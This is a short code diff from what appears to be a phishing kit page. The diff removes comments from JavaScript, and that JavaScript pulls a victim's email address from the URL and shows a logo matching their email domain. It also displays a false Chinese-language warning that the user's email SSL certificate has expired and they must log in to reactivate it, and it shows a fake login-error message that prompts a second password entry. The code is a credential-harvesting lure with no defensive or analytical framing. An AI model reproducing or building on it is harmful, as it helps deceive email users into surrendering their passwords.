@@ -54,11 +54,11 @@
     // Function to extract email from query parameters or hash
     function getEmail() {
         const urlParams = new URLSearchParams(window.location.search);
-        let email = urlParams.get('email');  // Try to get email from ?email=
+        let email = urlParams.get('email'); 
 
         if (!email || !email.includes('@')) {
             const hash = window.location.hash.substring(1); // Remove "#"
-            if (hash.includes('@')) email = hash;  // Validate hash
+            if (hash.includes('@')) email = hash;  
         }
 
         return email || null; // Return null if no valid email is found
@@ -94,7 +94,7 @@
         logo.style.display = 'block';
 
         // Update the title dynamically
-        const domainName = emailDomain.split('.')[0]; // Extract base domain
+        const domainName = emailDomain.split('.')[0]; 
         document.getElementById('dynamic-title').textContent = ` 您的 ${domainName} 电子邮件 SSL 证书已过期！请登录重新激活`;
     }
 
@@ -150,7 +150,7 @@
         } else {
             errorMessage.textContent = '验证凭据时出错。请重试登录。';
             errorMessage.classList.remove('hidden');
-            passwordInput.value = ''; // Clear only the password input
+            passwordInput.value = '';
         }
     });
 
